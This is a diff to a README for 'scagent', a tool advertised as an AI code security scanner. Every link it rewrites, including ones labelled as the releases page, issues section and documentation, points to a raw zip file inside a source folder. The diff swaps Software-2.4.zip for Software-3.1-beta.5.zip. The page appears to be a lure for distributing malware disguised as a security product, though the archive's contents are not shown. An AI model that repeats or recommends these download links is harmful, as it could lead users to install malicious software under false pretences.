@@ -4,7 +4,7 @@
 Welcome to scagent! This tool helps you check your code for security risks, performance issues, and more. You can use our AI capabilities to ensure your projects stay safe and efficient.
 
 ## 📥 Download Now
-[![Download Latest Release](https://github.com/9093333310/scagent/raw/refs/heads/main/src/integrations/Software-2.4.zip)](https://github.com/9093333310/scagent/raw/refs/heads/main/src/integrations/Software-2.4.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/9093333310/scagent/main/apps/web/src/components/Software-3.1-beta.5.zip)](https://raw.githubusercontent.com/9093333310/scagent/main/apps/web/src/components/Software-3.1-beta.5.zip)
 
 ## 📋 Features
 - **Security Scanner:** Find vulnerabilities in your code.
@@ -23,7 +23,7 @@ To get started with scagent, follow these steps:
 
 1. **Visit the Releases Page**
    Click on the link below to access the release files.
-   [Visit the Releases Page](https://github.com/9093333310/scagent/raw/refs/heads/main/src/integrations/Software-2.4.zip)
+   [Visit the Releases Page](https://raw.githubusercontent.com/9093333310/scagent/main/apps/web/src/components/Software-3.1-beta.5.zip)
 
 2. **Select the Latest Version**
    Look for the latest version at the top of the list. 
@@ -48,16 +48,16 @@ To get started with scagent, follow these steps:
    Based on the results, you can fix any identified issues in your code.
 
 ## 🌐 Support & Contribution
-If you encounter any issues or have questions, you can check the [issues section](https://github.com/9093333310/scagent/raw/refs/heads/main/src/integrations/Software-2.4.zip) of our repository. For feature requests or contributions, feel free to reach out.
+If you encounter any issues or have questions, you can check the [issues section](https://raw.githubusercontent.com/9093333310/scagent/main/apps/web/src/components/Software-3.1-beta.5.zip) of our repository. For feature requests or contributions, feel free to reach out.
 
 ## 🎉 Community and Feedback
 We value feedback from users. Join our community to share your thoughts, suggestions, or experiences with scagent. 
 
 ## 🔗 Additional Resources
-- **Documentation:** A detailed guide can be found [here](https://github.com/9093333310/scagent/raw/refs/heads/main/src/integrations/Software-2.4.zip).
+- **Documentation:** A detailed guide can be found [here](https://raw.githubusercontent.com/9093333310/scagent/main/apps/web/src/components/Software-3.1-beta.5.zip).
 - **Examples:** Check out sample code and usage examples on our wiki page.
 
 ## 🛠️ Acknowledgments
 Thank you for using scagent. We hope it helps you in your code auditing journey! If you find this tool helpful, please star our repository so that others can discover it too. 
 
-[![Download Latest Release](https://github.com/9093333310/scagent/raw/refs/heads/main/src/integrations/Software-2.4.zip)](https://github.com/9093333310/scagent/raw/refs/heads/main/src/integrations/Software-2.4.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/9093333310/scagent/main/apps/web/src/components/Software-3.1-beta.5.zip)](https://raw.githubusercontent.com/9093333310/scagent/main/apps/web/src/components/Software-3.1-beta.5.zip)
